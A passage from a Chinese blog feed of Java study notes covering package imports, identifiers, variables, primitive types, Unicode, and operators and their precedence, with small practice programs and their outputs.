<h4 id="2-3-包的引用"><a href="#2-3-包的引用" class="headerlink" title="2.3  包的引用"></a><font color="#20B2AA" face="Comic sans MS">2.3  包的引用</font></h4><p><font face="Comic sans MS"><strong>1. 📒使用全名引用：</strong><br>&amp;emsp;(1) 同包的类相互引用时：<br>&amp;emsp;&amp;emsp;&amp;emsp;      <font color="red">在使用的属性或方法名前加上类名作为前缀即可.</font><br>&amp;emsp;(2) 不同包中的类相互引用时：<br>&amp;emsp;&amp;emsp;&amp;emsp;      <font color="red">在类名的前面再加上包名——类的全名.</font><br>&amp;emsp;&amp;emsp;&amp;emsp;      例如：Class myDate extends java.util.Date{<br>&amp;emsp;&amp;emsp;&amp;emsp;      java.util.Date d&#x3D;new java.util.Date();<br>&amp;emsp;&amp;emsp;&amp;emsp;      ……<br>&amp;emsp;&amp;emsp;&amp;emsp;       }</p>
<p><strong>2. 📒使用import：</strong><br>&amp;emsp;&amp;emsp;import可以加载整个包中的文件或包中的某一个文件。import语句的格式为：<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;<font color="#00B2EE">import package1[.package2…].(classname|*);</font><br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*; </span><br><span class="line"><span class="keyword">import</span> java.util.Date; </span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*; </span><br><span class="line"><span class="keyword">import</span> java.util.Date; </span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDate</span> <span class="keyword">extends</span> <span class="title">Date</span></span>&#123;</span><br><span class="line">         Date d=<span class="keyword">new</span> Date();</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font color="red" face="Comic sans MS"><strong>注意：java编译器会为所有程序自动引入包java.lang，因此不必用import语句引入它包含的所有的类，但是若需要使用其他包中的类，必须用import语句引入。</strong></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-4-编译和运行包中的类"><a href="#2-4-编译和运行包中的类" class="headerlink" title="2.4  编译和运行包中的类"></a><font color="#20B2AA" face="Comic sans MS">2.4  编译和运行包中的类</font></h4><p><font face="Comic sans MS">当程序中用package语句指明一个包，在编译时产生的字节码文件（.class文件）需要放到相应的以包名为名称的文件夹目录下：<br>   （1）手工建立子目录，以包名命名该目录，再将.class文件复制到相应目录下。<br>   （2）在编译时，使用“javac –d”命令<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-5-Java包"><a href="#2-5-Java包" class="headerlink" title="2.5  Java包"></a><font color="#20B2AA" face="Comic sans MS">2.5  Java包</font></h4><p><font face="Comic sans MS">&amp;emsp;&amp;emsp;Java自带了一些包。这些包以“java.”开头，作为java的一个标准部分发布。学习Java，必须学习Java常用包中的类。从第六章开始，主要内容是介绍Java常用包的使用。</p>
<p><a href="https://www.breakyizhan.com/java/4260.html">包的使用参考。</a><br><a href="https://www.breakyizhan.com/java/4313.html">输入流的使用参考。</a><br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java语言基础的字符常变量等(3.1-3.3)</title>
    <url>/post/Java-Language-2-1/</url>
    <content><![CDATA[<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>标识符,注释和分隔符、变量和常量、基本类型</font></center>
&ensp;
&ensp;

<h4 id="一、-标识符、注释和分隔符"><a href="#一、-标识符、注释和分隔符" class="headerlink" title="一、 标识符、注释和分隔符"></a><font color="#FF6347" face="Comic sans MS">一、 标识符、注释和分隔符</font></h4><p><font color="red" face="Arial">📒标识符：</font><font face="Arial">是程序员用来标记语言中元素（变量、常量、类、对象等）名称的命名记号。</font></p>
<table><tr><td bgcolor=#B0E0E6>Java中的标识符遵守先定义后使用的原则。即只有定义了的标识符，才可在语句部分使用。</td></tr></table>

<p><font color="#EE7942" face="Arial"><strong>Java定义标识符的规则：</strong></font><br>(1)由字母、 数字、下划线、$组成，不能由数字开头<br>(2)不能是Java中的保留字(关键字)；<br>(3)大小写敏感，长度无限制。</p>
<p>&amp;emsp;</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>保留字</th>
</tr>
</thead>
<tbody><tr>
<td><font color="#EE3A8C" face="Arial">类型保留字</font></td>
<td><font face="Comic sans MS" color="#EE3A8C"> boolean, byte, char, short,  int, long,float, double, void</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">语句保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> if, else, switch, case, default, break, for, while, do,return,continue,try,catch,finally,throw,synchronized</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">表达式保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> new, null, this, super</td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">修饰符保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> abstract, final, public, private, protected, static, transient, volatile </font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">类、方法保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> class, throws, native, instanceof</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">扩展类构筑模块保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> package, import, extends, implements, interface<font face="Comic sans MS" color="#EE3A8C"></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">其它保留字</td>
<td><font face="Comic sans MS" color="#EE3A8C"> cast, futuer, generic, inner, oprater, outer, rest,var<font face="Comic sans MS"></td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h5 id="1-1-标识符"><a href="#1-1-标识符" class="headerlink" title="1.1  标识符"></a><font color="#3CB371" face="Comic sans MS">1.1  标识符</font></h5><table><tr><td bgcolor=#ADD8E6><font color=""  face="Comic sans MS">**举例**：
合法标识符：     A , a1,  $Systembol,  square,  ex_sa
不合法标识符：          1a          （以数字1开头）
                       break       （禁止使用保留字）
                       TWO  WORDS  （含有空格）
                       .NO         （有圆点）
</font></td></tr></table>


<p>&amp;emsp;</p>
<h5 id="1-2-注释"><a href="#1-2-注释" class="headerlink" title="1.2  注释"></a><font color="#3CB371" face="Comic sans MS">1.2  注释</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**Java有三种注释形式：**
      1.“//” 单行注释。表示从此向后，直到行尾都是注释。
      2.“/\*……\*/“ 块注释。在“/\*”和“\*/”之间都是注释。
      3.“/\*\*……\*/”文档注释。所有在“/\*\*”和“\*/”之间的内容可以用来自动形成文档。</font></td></tr></table>


<p>&amp;emsp;</p>
<h5 id="1-3-语句"><a href="#1-3-语句" class="headerlink" title="1.3  语句"></a><font color="#3CB371" face="Comic sans MS">1.3  语句</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">与C++一样，Java中的语句也是最小的执行单位。
&emsp;&emsp;&emsp;&emsp;各个语句之间以  ;  间隔
&emsp;&emsp;&emsp;&emsp;X大括号{   }内的一系列语句称为语句块</font></td></tr></table>

<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="二、-变量和常量"><a href="#二、-变量和常量" class="headerlink" title=" 二、 变量和常量"></a><font color="#FF6347" face="Comic sans MS"> 二、 变量和常量</font></h4><h5 id="2-1-变量"><a href="#2-1-变量" class="headerlink" title="2.1  变量"></a><font color="#3CB371" face="Comic sans MS">2.1  变量</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">📒Java的变量有两种：<font color="red">**局部变量  类成员变量**</font>
变量必须先定义后使用！变量的定义形式如下：
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<font color="red">类型      变量名表；</font></font></td></tr></table>

<blockquote>
<p>注意：局部变量在使用前必须给定初值，否则，将编译出错，而类成员变量无此要求。</p>
</blockquote>
<p><font face="Comic sans MS">如下出现编译错误，缺少“y&#x3D;8;”</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">  int x;</span><br><span class="line">  void <span class="function"><span class="title">method</span></span>()&#123;</span><br><span class="line">      int y; </span><br><span class="line">      System.out.println(x)</span><br><span class="line">      System.out.println(y);&#125;</span><br><span class="line">  public static void main(String[] args)&#123;</span><br><span class="line">       <span class="built_in">test</span> t=new <span class="built_in">test</span>();</span><br><span class="line">       t.method();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h6 id="2-1-1-变量名"><a href="#2-1-1-变量名" class="headerlink" title="2.1.1  变量名 "></a><font color="#3CB371" face="Comic sans MS">2.1.1  变量名 </font></h6><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**1. 📒在Java中用标识符来表示变量名**。
&emsp;&emsp;1.1 变量名中字母大写和小写是有区别的，如name和Name表示两个不同的变量名；
&emsp;&emsp;1.2 变量名标志存放变量值的内存位置，其内存存放的内容是变量的值。
**2. 📒命名方法**:
2.1 程序员应该为变量取有意义的名称，以利于程序的阅读和理解；
2.2 习惯上，变量名以小写字母开头，若一个变量名由超过一个单词所组成，则第一个单词之后的所有单词都以大写字母开头，以便于理解该变量名。
&emsp;&emsp;例如，anIntVar
</font></font></td></tr></table>

<p>&amp;emsp;</p>
<h6 id="2-1-2-变量的类型"><a href="#2-1-2-变量的类型" class="headerlink" title="2.1.2   变量的类型 "></a><font color="#3CB371" face="Comic sans MS">2.1.2   变量的类型 </font></h6><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**变量类型用于表述数据的格式和结构。**
📒**Java中的数据类型可分为两大类：**
<font color="red">**基本数据类型：**</font>整数类型、实数类型、字符型、布尔型          
<font color="red">**构造数据类型：**</font>Java 语言中构造类型用类来描述。
</font></font></td></tr></table>

<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="三、-基本数据类型表-变量和常量"><a href="#三、-基本数据类型表-变量和常量" class="headerlink" title=" 三、 基本数据类型表:变量和常量"></a><font color="#FF6347" face="Comic sans MS"> 三、 基本数据类型表:变量和常量</font></h4><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr1nnP.png" alt="1"></p>
<p>&amp;emsp;</p>
<h5 id="3-1-整型"><a href="#3-1-整型" class="headerlink" title="3.1  整型"></a><font color="#3CB371" face="Comic sans MS">3.1  整型</font></h5><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr10NF.png" alt="2"></p>
<p>&amp;emsp;</p>
<h6 id="3-1-1-整型常量"><a href="#3-1-1-整型常量" class="headerlink" title="3.1.1  整型常量"></a><font color="#3CB371" face="Comic sans MS">3.1.1  整型常量</font></h6><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr1jUS.png" alt="3"></p>
<p>&amp;emsp;</p>
<h6 id="3-1-2-整型变量"><a href="#3-1-2-整型变量" class="headerlink" title="3.1.2  整型变量"></a><font color="#3CB371" face="Comic sans MS">3.1.2  整型变量</font></h6><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr3S3j.png" alt="4"></p>
<p>&amp;emsp;</p>
<h5 id="3-2-实型"><a href="#3-2-实型" class="headerlink" title="3.2  实型"></a><font color="#3CB371" face="Comic sans MS">3.2  实型</font></h5><p><img data-src="https://s1.ax1x.com/2018/12/20/Fr3uvR.png" alt="5"></p>
<p>&amp;emsp;</p>
<h6 id="3-2-1实型常量有两种表示法："><a href="#3-2-1实型常量有两种表示法：" class="headerlink" title="3.2.1实型常量有两种表示法："></a><font color="#3CB371" face="Comic sans MS">3.2.1实型常量有两种表示法：</h6><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**(1)十进制表示法**
&emsp;&emsp;-3.5f&emsp;0.0f&emsp;123.45f&emsp;+678.9f
      要注意,采用十进制表示法时,小数点的两侧都必须有数字, 缺一不可，如+123．和 .56都是不合法的。
**(2)科学表示法：** <font face="Comic sans MS" color="red">**<尾数> E <阶码 > **</font>
&emsp;&emsp;-1.234567E+12&emsp;(-1.2345678901×1012)
&emsp;&emsp;尾数&emsp;阶码
**注意：**<font color="red">
&emsp;&emsp;&emsp;&emsp;尾数必须有，但小数部分可无；
&emsp;&emsp;&emsp;&emsp;阶码必须有，必须是整数。
&emsp;&emsp;&emsp;&emsp;基数是10
</font></font></td></tr></table>        
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**下列表示都是不正确的。**
&emsp;&emsp;E-6&emsp;&emsp;（缺尾数）
&emsp;&emsp;3E&emsp;&emsp;（无阶码）
&emsp;&emsp;2.E3&emsp;&emsp;（尾数出错）
&emsp;&emsp;2E1.2&emsp;&emsp;（阶码非整数）
&emsp;
**📒实型变量的定义**
例如：
float aFloatVar;
double aDoubleVar;<font>
</font></font></td></tr></table>

<p>&amp;emsp;</p>
<h5 id="3-3-布尔型"><a href="#3-3-布尔型" class="headerlink" title="3.3      布尔型"></a><font color="#3CB371" face="Comic sans MS">3.3      布尔型</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**📒布尔数据类型用于表达逻辑状态：**
&emsp;&emsp;布尔型数据只有两个值：true和false。
&emsp;&emsp;<font face="Comic sans MS" color="red">**注意: Java中不可将布尔类型看做整型值。true不对应1，false不对应0，不像C++一样。**</font></font></font></td></tr></table>

<p>&amp;emsp;</p>
<h5 id="3-4-字符型"><a href="#3-4-字符型" class="headerlink" title="3.4      字符型"></a><font color="#3CB371" face="Comic sans MS">3.4      字符型</font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**📒字符类型用来表示单个字符，采用16位二进制Unicode 编码表示**
字符常量是用两个单引号括起来的一个字符
&emsp;&emsp;例如： 'A'；  'a'； '2'； '我'；
也可用unicode代码表示一个字符常量
&emsp;&emsp;例如： '\u0041'
</font></font></td></tr></table>    

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="四、-Unicode编码"><a href="#四、-Unicode编码" class="headerlink" title=" 四、 Unicode编码"></a><font color="#FF6347" face="Comic sans MS"> 四、 Unicode编码</font></h4><table><tr><td bgcolor=#EEE0E5><font face="Comic sans MS">**📒Unicode编码：**
1. Java的字符使用Unicode编码，使用两个字节(16位)，所以它几乎包括所有字符，中文、日文、…，它支持世
   界上所有语言。  
2. 大多数语言使用ASCII码，用8位表示一个字符。ASCII码是Unicode码的一个子集，Unicode表示ASCII
   码时，其高位为0，它是其前255个字符。Unicode字符通常用十六进制。例如“\u0000”-“\u00ff”表示
   ASCII码集。”\u”表示转义字符，它用来表示其后四个十六进制数字是Unicode代码。
</font></font></td></tr></table> 

<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Java运算符和数据类型转换(3.4-3.6)</title>
    <url>/post/Java-Language-2-2/</url>
    <content><![CDATA[<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>运算符及表达式、运算符的优先级、数据类型转换</font></center>

<ul>
<li><input disabled="" type="checkbox"> <strong>3.4-3.6学习知识点</strong><ul>
<li><input disabled="" type="checkbox"> 运算符及表达式<ul>
<li><input disabled="" type="checkbox"> 算术运算符</li>
<li><input disabled="" type="checkbox"> 关系运算符</li>
<li><input disabled="" type="checkbox"> 逻辑运算符</li>
<li><input disabled="" type="checkbox"> 位运算符</li>
<li><input disabled="" type="checkbox"> 赋值运算符</li>
<li><input disabled="" type="checkbox"> 逻辑运算符</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> 运算符的优先级</li>
<li><input disabled="" type="checkbox"> 数据类型转换<ul>
<li><input disabled="" type="checkbox"> 自动类型转换</li>
<li><input disabled="" type="checkbox"> 手动强制类型转换</li>
<li><input disabled="" type="checkbox"> 隐含强制类型转换</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>&amp;ensp;<br>&amp;ensp;</p>
<h3 id="一、-运算符及表达式"><a href="#一、-运算符及表达式" class="headerlink" title="一、 运算符及表达式 "></a><font color="#FF6347" face="Comic sans MS">一、 运算符及表达式 </font></h3><p><font face="Comic sans MS">&amp;emsp;Java可以对各种类型的数据进行加工，这种加工过程称为<font color="#00B2EE"><strong>运算</strong></font> 。其中表示各种不同运算的符号称为<font color="#00B2EE"><strong>运算符</strong></font> ，参与运算的数据称为<font color="#00B2EE"><strong>操作数</strong></font> 。操作数和运算符按一定语法形式组成的符号序列称为表达式。每个表达式经过运算后都会产生一个确定的值。<br></font> </p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒运算符按其功能分为七类：**</font>
1. 算术运算符  + 、-、 \*、 /、%、 ++、 --
2. 关系运算符  > 、<、 >=、 <=、 ==、 !=
3. 逻辑运算符  ！、&&、||、&、|
4. 位运算符     >>、<<、>>>、&、|、^、~
5. 条件运算符  ？：
6. 赋值运算符  =、+=、-= 、\*= 、/=
7. 其他：下标运算符[]

<p><font color="red"><strong>📒运算符按其要求的操作数个数分为三种：</strong></font></p>
<ol>
<li>一元运算符  如  ++、–</li>
<li>二元运算符  如  +、-、*、&#x2F;、%(求模)</li>
<li>三元运算符  如  ？：<br></font></td></tr></table></li>
</ol>
<hr>
<hr>
<p>&amp;emsp;</p>
<h4 id="1-1-算术运算符"><a href="#1-1-算术运算符" class="headerlink" title="1.1  算术运算符"></a><font color="#3CB371" face="Comic sans MS">1.1  算术运算符</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒算术运算符中的单目运算符**</font>
          如   +（一元加，取正值）、
               -（一元减，取负值）、
               ++ （增1运算符）、\-\- （减1运算符）

<p><strong>增1运算符(++)和减1运算符(--)：</strong><br>   只能用于变量，而不能用于常量或表达式。增量运算符和减量运算符的功能是将操作数的值加1或减1.</p>
<p>(1)<font color="red">增1运算符（减1运算符）在操作数的<strong>前面</strong>，</font>首先对操作数本身进行增减1运算，然后再参与其所在表达式的<br>  运算。<br>例：如果变量a的值为5，求下列表达式及a的值<br>      ① ++a +10<br>          表达式的值为16，a变为6<br>      ② --a +10<br>          表达式的值为14，a变为4<br>(2)<font color="red">增1运算符（减1运算符）在操作数的<strong>后面</strong>，</font>则首先让操作数参与计算整个表达式的值，然后再对操作数进行<br>   增减运算<br>  例：如果变量a的值为5，求下列表达式及a的值<br>            ① a++ +10<br>                   表达式的值为15，a变为6<br>            ② a-- +10<br>                   表达式的值为15，a变为4<br></font></td></tr></table></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">练习题1：写出该程序的输出结果</span><br><span class="line">class <span class="built_in">test</span></span><br><span class="line">&#123;</span><br><span class="line">      public static void main(String args[])</span><br><span class="line">     &#123;</span><br><span class="line">           int a=5;</span><br><span class="line">           System.out.println(++a);</span><br><span class="line">           System.out.println(--a);</span><br><span class="line">           System.out.println(a++);</span><br><span class="line">           System.out.println(a--);</span><br><span class="line">&#125; </span><br><span class="line">&#125;                        </span><br><span class="line">输出结果：</span><br><span class="line">6</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒算术运算符中的双目运算符 **</font>       
 如     +（加）、-（减）、\*（乘）、/（除）、  % （取余数或取模）。
       +，-，\* 是通常意义的加、减、乘
如果整数相除，则结果取整。如 5/2 得到结果2。    
如果浮点数相除，则是我们通常意义上的除法，如5.0/2.0结果为2.5。
%是取余，如 5%2结果为1
                         5.2%2结果为1.2
                         5.2%2.2结果为0.8 
                         10%-4结果2； -10%-4结果-2 

<p><font color="red"><strong>注意：</strong></font> 如果整数相除或取模 第二个操作数为0 编译无错 运行会出错 抛出异常；<br>          如果浮点数相除或取模 第二个操作数为0 结果为NaN 。<br>注意：</p>
<ol>
<li>整数    int a&#x3D;10&#x2F;0     运行报错<br>         int a&#x3D;10%0   运行报错</li>
<li>浮点数<br>  double a&#x3D;10.0&#x2F;0     Infinity(正无穷大)<br>  double a&#x3D;-10.0&#x2F;0   -Infinity（负无穷大）<br>  double a&#x3D;0.0&#x2F;0        NaN<br>  double a&#x3D;0.0%0        NaN<br></font></td></tr></table></li>
</ol>
<blockquote>
<blockquote>
<p><strong>思考：</strong>某个培训中心要为新到的学员安排房间，假设共有x个学员，每个房间可以住6人，让你用一个公式来计算他们要住的房间数？<br>答案：  (x+5)&#x2F;6<br>这也可以用于计算留言板的页数。 </p>
</blockquote>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-关系运算符"><a href="#1-2-关系运算符" class="headerlink" title="1.2  关系运算符"></a><font color="#3CB371" face="Comic sans MS">1.2  关系运算符</font></h4><font face="Comic sans MS">
<font color="#00B2EE">**1.关系运算符有七种：**</font>== ，!= ，< ,<= , > ,>= , instanceof  (对象运算符)
<font color="#00B2EE">**2.关系表达式的结果类型为布尔型**</font>
<font color="#00B2EE">**3.instanceof：**</font>用来确定一对象是否是某一指定类的对象</font>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> class <span class="built_in">test</span></span><br><span class="line">&#123;    public static void main(String args[])</span><br><span class="line">     &#123;    <span class="built_in">test</span> t1=new <span class="built_in">test</span>();</span><br><span class="line">          <span class="keyword">if</span>(t1 instanceof <span class="built_in">test</span>)&#123; System.out.println(<span class="string">&quot;是&quot;</span>);&#125;    </span><br><span class="line">     &#125; &#125; </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="red" face="Comic sans MS"><strong>📒关系表达式</strong></font></p>
<p><img data-src="https://i.loli.net/2019/01/11/5c3864c7165e7.png" alt="1.png"></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-逻辑运算符"><a href="#1-3-逻辑运算符" class="headerlink" title="1.3  逻辑运算符"></a><font color="#3CB371" face="Comic sans MS">1.3  逻辑运算符</font></h4><p><img data-src="https://i.loli.net/2019/01/11/5c3866ddb16bb.png" alt="2.png"> <img data-src="https://i.loli.net/2019/01/11/5c38674613277.png" alt="3.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例：分析下列程序的输出结果</span><br><span class="line">class <span class="built_in">test</span>&#123;    </span><br><span class="line">	public static void main(String args[])&#123; </span><br><span class="line">		boolean s;int i=100;</span><br><span class="line">		s=(3&gt;2)&amp;&amp;(i++==1);</span><br><span class="line">		System.out.println(i);</span><br><span class="line">		i=100;</span><br><span class="line">		s=(3&lt;2)&amp;&amp;(i++==1);</span><br><span class="line">		System.out.println(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line">输出结果：</span><br><span class="line">101</span><br><span class="line">100</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-位运算符"><a href="#1-4-位运算符" class="headerlink" title="1.4  位运算符"></a><font color="#3CB371" face="Comic sans MS">1.4  位运算符</font></h4><p><img data-src="https://i.loli.net/2019/01/11/5c386923e4c7a.png" alt="4.png"><img data-src="https://i.loli.net/2019/01/11/5c38692468530.png" alt="5.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例：分析下列程序的输出结果</span><br><span class="line">int a=7, b=8, c;</span><br><span class="line">	c = a &amp; b;     //c=00000000000000000000000000000000=0</span><br><span class="line">	c = a | b;     //c=00000000000000000000000000001111=15</span><br><span class="line">	c = a ^ b;     //c=00000000000000000000000000001111=15</span><br><span class="line">    c =~a;         //c=11111111111111111111111111111000=-8</span><br><span class="line"></span><br><span class="line">例：分析下列程序的输出结果</span><br><span class="line">    int a=7,c;     //a=00000000000000000000000000000111</span><br><span class="line">	c = a&gt;&gt;3;      //c=00000000000000000000000000000000=0</span><br><span class="line">	c = a &lt;&lt; <span class="string">3;    //c=00000000000000000000000000111000=56</span></span><br><span class="line"><span class="string">	c = a &gt;&gt;&gt; 3</span>;   //c=00000000000000000000000000000000=0</span><br><span class="line">int a =-8; </span><br><span class="line">System.out.println(a&gt;&gt;&gt;1) //结果2147483644</span><br><span class="line">int i=88&gt;&gt;32; System.out.println(i)  //结果88</span><br><span class="line">//（在进行移位之前，java系统首先把移的位数与被移位数求余数，然后移动这个位数）</span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS"><font color="red"><strong>注意：</strong></font><br>（1）右移n位后的结果与除以2的n次方效果相同<br>（2）左移n位后的结果与乘以2的n次方效果相同<br>（3）无符号右移要慎重<br></font></p>
<blockquote>
<blockquote>
<p>思考：  如何用一个表达式计算2的X次方？<br>答案：  1&lt;&lt;x<br>将1左移x位 </p>
</blockquote>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-5-赋值运算符"><a href="#1-5-赋值运算符" class="headerlink" title="1.5  赋值运算符"></a><font color="#3CB371" face="Comic sans MS">1.5  赋值运算符</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**(1)简单赋值运算符    = **</font> 
将等号右边的表达式的值赋给等号左边的变量
       例如：     int c,d;
                     c=1;
                     d=c+10;
<font color="red">**(2)复合赋值运算符      +=、-=、*=、/=、%= 等**</font> 
一般形式为：   变量 op= 表达式
等价于:     变量 =变量 op 表达式
c += a;     //c = c +a;
c -= a;     //c = c -a;
c *= a;     //c = c * a;

<p>例：int a&#x3D;1;<br>        double x&#x3D;2;<br>        a+&#x3D;2;           &#x2F;&#x2F; 就是a&#x3D;a+2, 结果使a的值为3<br>        x*&#x3D;x+3;       &#x2F;&#x2F; 就是x&#x3D;x*(x+3), 结果使x的值为10.0<br>        int a&#x3D;b&#x3D;c&#x3D;d&#x3D;12;<br>        int a&#x3D;(b&#x3D;(c&#x3D;(d&#x3D;12))); &#x2F;&#x2F;赋值运算符有返回值，返回值是&#x3D;右边的值</p>
<p><font color="red"><strong>注意：</strong></font></p>
<ol>
<li>boolean型的只能赋给boolean型；</li>
<li>其他七种类型如果能自动转换则可直接赋值，否则要进行强制类型转换。<br></font></td></tr></table></li>
</ol>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-6-条件运算符"><a href="#1-6-条件运算符" class="headerlink" title="1.6  条件运算符"></a><font color="#3CB371" face="Comic sans MS">1.6  条件运算符</font></h4><p><font face="Comic sans MS">Java 中唯一的三元运算符，其格式如下：<br><font color="#00B2EE">&amp;emsp;&amp;emsp;<strong>变量 &#x3D;  &lt;布尔表达式&gt; ? &lt;表达式1&gt; : &lt;表达式2&gt;</strong></font><br>含义是：当&lt;布尔表达式&gt;为真时，变量的值为&lt;表达式1&gt;的值，否则为&lt;表达式2&gt;的值。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例:  条件运算</span><br><span class="line">public class max </span><br><span class="line">&#123;</span><br><span class="line">       public static void main(String args[]) </span><br><span class="line">      &#123;</span><br><span class="line">            int x=20,y=30,max;</span><br><span class="line">            max = (x&gt;y) ? x : y;      </span><br><span class="line">            System.out.println(“max=”+max);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：max=30</span><br><span class="line"></span><br><span class="line">练习题2:</span><br><span class="line">public class max </span><br><span class="line">&#123;</span><br><span class="line">       public static void main(String args[]) </span><br><span class="line">      &#123;</span><br><span class="line">      int a=3,b=4,c;</span><br><span class="line">      c=a&gt;b? ++a:b++;</span><br><span class="line">      System.out.println(a+<span class="string">&quot;、&quot;</span>+b+<span class="string">&quot;、&quot;</span>+c);    </span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">3、5、4</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二、-运算符的优先级"><a href="#二、-运算符的优先级" class="headerlink" title="二、 运算符的优先级 "></a><font color="#FF6347" face="Comic sans MS">二、 运算符的优先级 </font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>表达式的运算次序取决于表达式中各种运算符的优先级。</strong></font><br>     （1）优先级高的先运算，优先级低的后运算。<br>     （2）括号( )的优先级最高。<br>     （3）优先级相同的情况下要考虑结合性，即从左向右运算还是从右向左运算。<br><font color="#00B2EE"><strong>Java语言规定的运算符的优先级如下表所示</strong></font><br></font></p>
<p><img data-src="https://i.loli.net/2019/01/11/5c3871997c702.png" alt="6.png"></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**运算符的优先级与结合性的一些规律：**</font> 
1. 优先级
<font color="red">       () > 单目运算符 > 双目运算符 > 三目运算符 > 赋值运算符</font> 
双目： <font color="red">算术>关系>逻辑</font> 。
2. 结合性
<font color="red">大多数运算符结合性为从左至右
赋值运算符的结合性为从右至左</font> 
    int a,b=3,c=5;
    a = b = c;    //结果：a、b、c均为 5 

<p><font color="red"><strong>表达式写法的习惯：</strong></font> </p>
<p>  (1) 除非是简单的直观运算，应该尽量使用括号<br>  (2)另外，尽量不要写太长的表达式，过长的表达式容易引 起对求值次序的误解。<br></font></td></tr></table></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例：</span><br><span class="line">    (1) a + b * c</span><br><span class="line">    (2) a = b || c</span><br><span class="line">    (3) a + b &lt; c &amp;&amp; d==e</span><br><span class="line">    (4) a=8 – 2 * 3 &lt;4 &amp;&amp; 5 &lt; 2     结果：<span class="literal">false</span></span><br></pre></td></tr></table></figure>

